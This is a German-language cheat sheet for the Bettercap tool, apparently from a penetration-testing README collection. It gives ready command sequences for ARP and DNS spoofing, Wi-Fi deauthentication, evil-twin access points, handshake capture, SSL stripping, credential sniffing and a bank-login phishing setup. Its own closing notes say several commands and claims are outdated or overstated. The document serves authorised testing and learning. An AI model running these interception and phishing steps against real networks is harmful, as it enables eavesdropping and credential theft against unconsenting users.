# 🦈 Bettercap – Cheatsheet für Netzwerkangriffe

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██████╗ ███████╗████████╗████████╗███████╗██████╗  ██████╗ █████╗ ██████╗ 
  ██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
  ██████╔╝█████╗     ██║      ██║   █████╗  ██████╔╝██║     ███████║██████╔╝
  ██╔══██╗██╔══╝     ██║      ██║   ██╔══╝  ██╔══██╗██║     ██╔══██║██╔═══╝ 
  ██████╔╝███████╗   ██║      ██║   ███████╗██║  ██║╚██████╗██║  ██║██║     
  ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
            Vielseitiges Werkzeug für Netzwerkangriffe
```

<p align="center">
  <img src="https://img.shields.io/badge/Bettercap-MITM-blue?style=for-the-badge" alt="Bettercap">
  <img src="https://img.shields.io/badge/WiFi-Attacks-red?style=for-the-badge" alt="WiFi">
  <img src="https://img.shields.io/badge/Network-Recon-green?style=for-the-badge" alt="Network">
</p>

---

## 📋 Inhaltsverzeichnis

- [Was ist Bettercap?](#-was-ist-bettercap)
- [Installation](#-installation)
- [Grundlegende Verwendung](#-grundlegende-verwendung)
- [Netzwerkaufklärung](#-netzwerkaufklärung)
- [ARP-Spoofing (MITM)](#-arp-spoofing-mitm)
- [DNS-Spoofing](#-dns-spoofing)
- [WLAN-Angriffe](#-wlan-angriffe)
- [HTTPS-Downgrade](#-https-downgrade)
- [Zugangsdaten im Datenverkehr erfassen](#-zugangsdaten-im-datenverkehr-erfassen)
- [Caplets](#-caplets)
- [Weboberfläche](#-weboberfläche)
- [Schnellübersicht](#-schnellübersicht)

---

## 🎯 Was ist Bettercap?

**Bettercap** ist ein vielseitiges Werkzeug für WLAN-, Bluetooth- und Netzwerkaufklärung. Es knüpft an ettercap an und bietet moderne Funktionen:

- 🔍 **Netzwerkaufklärung** – Hosts und Dienste entdecken
- 🎭 **MITM-Angriffe** (Man-in-the-Middle) – ARP- und DNS-Spoofing
- 📶 **WLAN-Angriffe** – Deauthentifizierung, Evil Twin (nachgebildeter Access Point), Handshakes aufzeichnen
- 🔓 **Zugangsdaten erfassen** – HTTP, HTTPS (Downgrade)
- 📡 **Bluetooth/BLE** – Geräteerkennung und Angriffe
- 🌐 **Weboberfläche** – Grafische Bedienoberfläche

### Funktionen

| Funktion | Beschreibung |
|---------|-------------|
| **Modular** | Mit Caplets erweiterbar |
| **Interaktiv** | Befehlskonsole in Echtzeit |
| **Skriptfähig** | Abläufe mit Caplet-Dateien automatisieren |
| **Weboberfläche** | Browserbasierte Oberfläche |
| **Programmiersprache Go** | Schnell, modern, plattformübergreifend |

---

## 🚀 Installation

### Kali Linux (vorinstalliert)

```bash
# In Kali bereits installiert
bettercap --help

# Aktualisieren
sudo apt update && sudo apt install bettercap
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install bettercap
```

### Aus dem Quellcode

```bash
# Zuerst Go installieren
sudo apt install golang

# Bettercap installieren
go install github.com/bettercap/bettercap@latest

# Alternativ
git clone https://github.com/bettercap/bettercap
cd bettercap
make build
sudo make install
```

### Oberfläche installieren (optional)

```bash
# Weboberfläche herunterladen
sudo bettercap -eval "caplets.update; ui.update; quit"
```

---

## 💻 Grundlegende Verwendung

### Bettercap starten

```bash
# Einfacher Start (Root-Rechte erforderlich)
sudo bettercap

# Schnittstelle angeben
sudo bettercap -iface eth0
sudo bettercap -iface wlan0

# Nicht interaktiv (Befehle ausführen)
sudo bettercap -eval "net.probe on; net.show"

# Caplet-Datei laden
sudo bettercap -caplet http-ui
```

### Interaktive Konsole

```bash
# In der Bettercap-Konsole
» help                      # Alle Befehle anzeigen
» help net.probe            # Hilfe zu einem bestimmten Modul
» net.show                  # Entdeckte Hosts anzeigen
» set arp.spoof.targets X   # Variable setzen
» arp.spoof on              # Modul aktivieren
» quit                      # Beenden
```

### Module verwalten

```bash
# Alle Module auflisten
» help

# Modulinformationen abrufen
» help arp.spoof

# Modul aktivieren
» arp.spoof on

# Modul deaktivieren
» arp.spoof off

# Moduleinstellungen anzeigen
» get arp.spoof.*
```

---

## 🔍 Netzwerkaufklärung

### Hosts entdecken

```bash
# Aktive Netzwerkerkennung aktivieren
» net.probe on

# Entdeckte Hosts anzeigen
» net.show

# Ausgabe:
┌─────────────────────────────────────────────────────────────┐
│ IP               MAC                Vendor            Seen  │
├─────────────────────────────────────────────────────────────┤
│ 192.168.1.1      AA:BB:CC:DD:EE:FF  TP-Link           5s    │
│ 192.168.1.100    11:22:33:44:55:66  Apple             2s    │
└─────────────────────────────────────────────────────────────┘
```

### Netzwerkinformationen

```bash
# Aktuelle Schnittstelle anzeigen
» net.show

# Schnittstelleninformationen
» get net.interface.*

# Gateway-Informationen
» get gateway.*
```

### Optionen für aktive Erkennung

```bash
# Verzögerung zwischen Probe-Paketen festlegen
» set net.probe.throttle 10

# Passiver Modus (nur lauschen)
» set net.probe.passive true

# Zeitlimit für Probe-Pakete setzen
» set net.probe.timeout 500
```

### Aufklärungsbefehle

```bash
# Umfassende Netzwerkaufklärung
» net.recon on

# Hostliste leeren
» net.clear

# Nur aktive Hosts anzeigen
» set net.show.meta true
» net.show

# In eine Datei exportieren
» set net.sniff.output /tmp/capture.pcap
» net.sniff on
```

---

## 🎭 ARP-Spoofing (MITM)

### Einfaches ARP-Spoofing

```bash
# Bettercap starten
sudo bettercap -iface eth0

# Aktive Erkennung einschalten
» net.probe on

# Warten und anschließend Hosts anzeigen
» net.show

# Ziel (Opfer) festlegen
» set arp.spoof.targets 192.168.1.100

# ARP-Spoofing aktivieren
» arp.spoof on

# Jetzt befindet sich der Angreifer in der Mitte der Verbindung (MITM)!
```

### Full Duplex (beide Richtungen)

```bash
# Sowohl Opfer als auch Gateway manipulieren
» set arp.spoof.fullduplex true
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
```

### Gesamtes Subnetz manipulieren

```bash
# Alle Hosts außer dem Gateway als Ziel auswählen
» set arp.spoof.targets 192.168.1.0/24
» arp.spoof on

# Nur intern (Gateway nicht manipulieren)
» set arp.spoof.internal true
» arp.spoof on
```

### ARP-Spoofing und Mitschneiden

```bash
# Vollständiger MITM-Aufbau
» net.probe on
» set arp.spoof.targets 192.168.1.100
» set arp.spoof.fullduplex true
» arp.spoof on
» net.sniff on
```

---

## 🌐 DNS-Spoofing

### Einfaches DNS-Spoofing

```bash
# Zieldomains für DNS-Spoofing festlegen
» set dns.spoof.domains example.com, *.example.com

# Umleitungsadresse festlegen (eigener Rechner)
» set dns.spoof.address 192.168.1.50

# Aktivieren (setzt ARP-Spoofing voraus)
» arp.spoof on
» dns.spoof on
```

### Alle Domains umleiten

```bash
# Platzhalter – alles umleiten
» set dns.spoof.domains *
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### Mehrere Domains

```bash
# Liste der Domains
» set dns.spoof.domains facebook.com, *.facebook.com, twitter.com, *.twitter.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### DNS-Spoofing mit HTTP-Server

```bash
# Vollständiger Phishing-Aufbau
» set dns.spoof.domains login.example.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on

# HTTP-Server auf dem eigenen Rechner starten
» set http.server.path /var/www/phishing
» http.server on
```

---

## 📶 WLAN-Angriffe

### WLAN-Modus aktivieren

```bash
# Mit einer WLAN-Schnittstelle starten
sudo bettercap -iface wlan0

# WLAN-Aufklärung aktivieren
» wifi.recon on

# Entdeckte Access Points anzeigen
» wifi.show
```

### WLAN-Aufklärung

```bash
# Alle Access Points anzeigen
» wifi.show

# Ausgabe:
┌───────────────────────────────────────────────────────────────────┐
│ RSSI  BSSID              Ch  Enc     ESSID               Clients │
├───────────────────────────────────────────────────────────────────┤
│ -45   AA:BB:CC:DD:EE:FF   6  WPA2    HomeNetwork              3  │
│ -60   11:22:33:44:55:66   1  WPA2    Office_WiFi              1  │
└───────────────────────────────────────────────────────────────────┘
```

### Deauthentifizierungsangriff

```bash
# Alle Clients eines bestimmten Access Points deauthentifizieren
» wifi.deauth AA:BB:CC:DD:EE:FF

# Einen bestimmten Client deauthentifizieren
» set wifi.deauth.station 11:22:33:44:55:66
» wifi.deauth AA:BB:CC:DD:EE:FF

# Wiederholte Deauthentifizierung
» set wifi.deauth.repeat 100
» wifi.deauth AA:BB:CC:DD:EE:FF
```

### Handshake aufzeichnen

```bash
# WLAN-Aufklärung aktivieren
» wifi.recon on

# Kanal festlegen (wie beim Ziel)
» wifi.recon.channel 6

# Handshakes aufzeichnen
» set wifi.handshakes.file /tmp/handshakes/

# Durch Deauthentifizierung eine neue Verbindung erzwingen
» wifi.deauth AA:BB:CC:DD:EE:FF

# Aufgezeichnete Handshakes prüfen
» wifi.show.wpa
```

### Evil-Twin-Angriff

```bash
# Access Point nachbilden
» set wifi.ap.ssid "Free WiFi"
» set wifi.ap.bssid AA:BB:CC:DD:EE:FF
» set wifi.ap.channel 6
» set wifi.ap.encryption false

# Nachgebildeten Access Point starten
» wifi.ap on

# Den echten Access Point deauthentifizieren, um Clients zur Verbindung zu bewegen
» wifi.deauth <real_AP_BSSID>
```

### PMKID-Angriff

```bash
# Moderner Angriff ohne verbundenen Client
» wifi.recon on
» wifi.assoc AA:BB:CC:DD:EE:FF

# PMKID wird im Handshake-Ordner aufgezeichnet
» wifi.show.wpa
```

---

## 🔒 HTTPS-Downgrade

### SSL-Stripping (HSTS-Umgehung)

```bash
# Zuerst ARP-Spoofing aktivieren
» arp.spoof on

# SSL-Stripping aktivieren
» set https.proxy.sslstrip true
» https.proxy on

# Alternativ HTTP-Proxy verwenden
» http.proxy on
```

### HTTPS-Proxy

```bash
# HTTPS-Proxy einrichten
» set https.proxy.address 0.0.0.0
» set https.proxy.port 8080
» https.proxy on

# Mit Zertifikat
» set https.proxy.certificate /path/to/cert.pem
» set https.proxy.key /path/to/key.pem
» https.proxy on
```

### HTTPS-Datenverkehr erfassen

```bash
# Vollständiger MITM-Aufbau mit HTTPS
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on
```

---

## 🔓 Zugangsdaten im Datenverkehr erfassen

### HTTP-Zugangsdaten

```bash
# Mitschneiden aktivieren
» net.sniff on

# Lokalen Sniffer aktivieren
» set net.sniff.local true
» net.sniff on

# HTTP filtern
» set net.sniff.filter "tcp port 80"
» net.sniff on
```

### Zugangsdaten sammeln

```bash
# Vollständige Erfassung von Zugangsdaten
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on

# Zugangsdaten erscheinen in Echtzeit
```

### In einer Datei speichern

```bash
# Aufgezeichnete Pakete speichern
» set net.sniff.output /tmp/capture.pcap
» net.sniff on

# Ausführliche Ausgabe
» set net.sniff.verbose true
» net.sniff on
```

---

## 📜 Caplets

### Was sind Caplets?

Caplets sind Skriptdateien (.cap), die Bettercap-Befehle automatisiert ausführen.

### Mitgelieferte Caplets

```bash
# Caplets auflisten
» caplets.show

# Häufige Caplets:
- http-ui       # Weboberfläche
- https-ui      # Geschützte Weboberfläche
- local-sniffer # Lokalen Datenverkehr mitschneiden
- mitm          # Einfacher MITM-Aufbau
- pita          # WLAN-Angriffe automatisieren
```

### Caplet laden

```bash
# Von der Kommandozeile
sudo bettercap -caplet http-ui

# In Bettercap
» caplet http-ui

# Aus einer Datei
sudo bettercap -caplet /path/to/custom.cap
```

### Eigenes Caplet erstellen

```bash
# Datei: my-mitm.cap
net.probe on
sleep 5
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
set net.sniff.verbose true
```

```bash
# Eigenes Caplet ausführen
sudo bettercap -caplet my-mitm.cap
```

### Caplets aktualisieren

```bash
# Alle Caplets aktualisieren
» caplets.update
```

---

## 🌐 Weboberfläche

### Weboberfläche starten

```bash
# Zuerst die Oberfläche installieren
sudo bettercap -eval "caplets.update; ui.update; quit"

# Mit Weboberfläche über HTTP starten
sudo bettercap -caplet http-ui

# Mit HTTPS-Oberfläche starten
sudo bettercap -caplet https-ui

# Aufruf: https://127.0.0.1:8080/
# Standardzugangsdaten: user/pass
```

### Funktionen der Weboberfläche

| Funktion | Beschreibung |
|---------|-------------|
| **Dashboard** | Netzwerkansicht in Echtzeit |
| **Hosts** | Entdeckte Geräte |
| **WiFi** | Drahtlose Netzwerke |
| **BLE** | Bluetooth-Geräte |
| **Events** | Aktivitätsprotokoll |
| **Packets** | Aufgezeichneter Datenverkehr |

### Weboberfläche konfigurieren

```bash
# Zugangsdaten festlegen
» set http.server.username admin
» set http.server.password secretpass

# Port festlegen
» set http.server.port 8080

# Bind-Adresse festlegen
» set http.server.address 0.0.0.0
```

---

## 📊 Schnellübersicht

### Wichtige Befehle

| Befehl | Beschreibung |
|---------|-------------|
| `net.probe on` | Host-Erkennung starten |
| `net.show` | Entdeckte Hosts anzeigen |
| `arp.spoof on` | ARP-Spoofing aktivieren |
| `net.sniff on` | Paketaufzeichnung starten |
| `dns.spoof on` | DNS-Spoofing aktivieren |
| `wifi.recon on` | WLAN-Suche starten |
| `wifi.deauth BSSID` | Deauthentifizierungsangriff |
| `https.proxy on` | HTTPS-Proxy aktivieren |

### Häufige Variablen

| Variable | Beschreibung |
|----------|-------------|
| `arp.spoof.targets` | Ziele des MITM-Angriffs |
| `arp.spoof.fullduplex` | Beide Richtungen manipulieren |
| `dns.spoof.domains` | Zu manipulierende Domains |
| `dns.spoof.address` | Ziel-IP der Umleitung |
| `net.sniff.output` | PCAP-Ausgabedatei |
| `wifi.ap.ssid` | Name des nachgebildeten Access Points |

### Vorlage für einen MITM-Angriff

```bash
# Einfacher MITM-Angriff
sudo bettercap -iface eth0 -eval "
net.probe on;
sleep 3;
set arp.spoof.targets 192.168.1.100;
set arp.spoof.fullduplex true;
arp.spoof on;
net.sniff on"
```

### Vorlage für einen WLAN-Angriff

```bash
# WLAN-Deauthentifizierung und Aufzeichnung
sudo bettercap -iface wlan0 -eval "
wifi.recon on;
sleep 5;
wifi.deauth AA:BB:CC:DD:EE:FF"
```

### Vollständiger Phishing-Angriff

```bash
# DNS-Spoofing und nachgebildete Website
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set dns.spoof.domains login.bank.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
» set http.server.path /var/www/fake-login
» http.server on
```

---

## ⚠️ Rechtlicher Hinweis

```
⚠️ WARNUNG: Bettercap ist ein leistungsfähiges Werkzeug, das
Netzwerkverkehr abfangen kann. Nur in EIGENEN Netzwerken oder mit
AUSDRÜCKLICHER SCHRIFTLICHER TESTGENEHMIGUNG verwenden.

✅ Autorisierte Penetrationstests
✅ Sicherheitsforschung in einer Laborumgebung
✅ Lernzwecke

❌ Unbefugtes Abfangen ist ILLEGAL
❌ Niemals in öffentlichen Netzwerken verwenden
❌ Niemals Zugangsdaten stehlen
```

---

## 📚 Ressourcen

- [Offizielle Bettercap-Website](https://www.bettercap.org/)
- [Bettercap GitHub](https://github.com/bettercap/bettercap)
- [Bettercap-Dokumentation](https://www.bettercap.org/modules/)
- [Caplets](https://github.com/bettercap/caplets)

### Verwandte Cheatsheets
- [Aircrack-ng](../../Aircrack-ng/translations/README.de.md)
- [Wifite](../../Wifite/translations/README.de.md)
- [Wireshark](../../Wireshark/translations/README.de.md)

---

## 📝 Ergänzende Hinweise zu den Originalbeispielen

- **Versionen und Module:** Die Vorlage ist kein unverändert passender Aufrufplan für jede Version. Die aktuelle Go-Installationsanleitung verwendet einen versionierten Modulpfad und nennt zusätzliche Bibliotheken. net.probe sendet aktiv Pakete; die gezeigten passive-/timeout-Variablen sind in der aktuellen Parameterliste nicht definiert. Auch net.show.meta ist kein allgemeiner Filter auf aktive Hosts. Der gezeigte interne caplet-Aufruf entspricht nicht dem aktuell dokumentierten include-Befehl. Verfügbare Befehle und Caplets hängen von Version und Installation ab. [Bettercap: Installation](https://www.bettercap.org/project/installation/), [net.probe](https://www.bettercap.org/modules/ethernet/netprobe/), [net.recon](https://www.bettercap.org/modules/ethernet/netrecon/), [interaktive Konsole](https://www.bettercap.org/usage/interactive_session/).
- **MITM und DNS:** Das Einschalten eines Spoofers beweist noch keine erfolgreiche Position im Datenpfad. Erreichbarkeit, Netzsegment, Schutzmechanismen und Verkehrsrichtung sind entscheidend. DNS-Spoofing benötigt sichtbare DNS-Anfragen; die Dokumentation nennt neben ARP auch DHCPv6 als möglichen Weg. Eine geänderte DNS-Antwort ersetzt keine gültige TLS-Identität. [Bettercap: ARP-Spoofing](https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/), [DNS-Spoofing](https://www.bettercap.org/modules/ethernet/spoofers/dnsspoof/).
- **WLAN-Beispiele:** Monitor Mode und Packet Injection müssen von Schnittstelle und Treiber unterstützt werden. wifi.ap beschreibt das Senden nachgebildeter Management-Beacons, keinen vollständig eingerichteten Zugangspunkt mit garantiertem Clientwechsel. Die aufgeführten Variablen wifi.deauth.station und wifi.deauth.repeat sowie wifi.show.wpa stehen nicht in der aktuellen Referenz. Die Handshake-Ablage hängt von Dateipfad und Aggregationseinstellung ab; ein Ordnerpfad allein legt dieses Verhalten nicht fest. PMKID funktioniert nur bei passenden Access Points und ist keine universelle clientlose Schwachstelle. [Bettercap: WLAN-Module und Parameter](https://www.bettercap.org/modules/wifi/).
- **HTTPS und HSTS:** Die Überschrift „HSTS-Umgehung“ ist zu pauschal. Ein bekannter HSTS-Host wird vom Browser über HTTPS aufgerufen; TLS-Fehler dürfen dort nicht einfach übergangen werden. SSL-Stripping oder ARP-/DNS-Spoofing allein entschlüsseln daher nicht beliebige HTTPS-Verbindungen. Der HTTPS-Proxy erzeugt mit seiner eigenen CA signierte Zertifikate; der Client muss deren Vertrauenskette akzeptieren. Die Beispiele bleiben unverändert. [RFC 6797, Abschnitte 8.3–8.4](https://www.rfc-editor.org/rfc/rfc6797.html#section-8.3), [Bettercap: HTTPS-Proxy](https://www.bettercap.org/modules/ethernet/proxies/httpsproxy/).
- **Weboberfläche und Zugangsdaten:** Aktuelle Dokumentation trennt UI, REST-API und HTTP-Dateiserver. Einstellungen des HTTP-Servers sind deshalb keine pauschale Konfiguration der API-Anmeldung; Schema und Port hängen vom gestarteten Dienst beziehungsweise Caplet ab. Die aktuelle UI-Anleitung und die historischen http-ui-/https-ui-Beispiele sind unterschiedliche Versionskontexte. Die angegebenen Standardwerte sind keine Garantie für jede Installation. [Bettercap: Weboberfläche](https://www.bettercap.org/usage/web_ui/), [UI-Modul](https://www.bettercap.org/modules/core/ui/), [REST-API](https://www.bettercap.org/modules/core/apirest/).

---

<p align="center">
  <b>🦈 Netzwerkangriffe verstehen und prüfen!</b><br>
  <i>Bettercap – ein vielseitiges Werkzeug für Netzwerk-Penetrationstests</i>
</p>
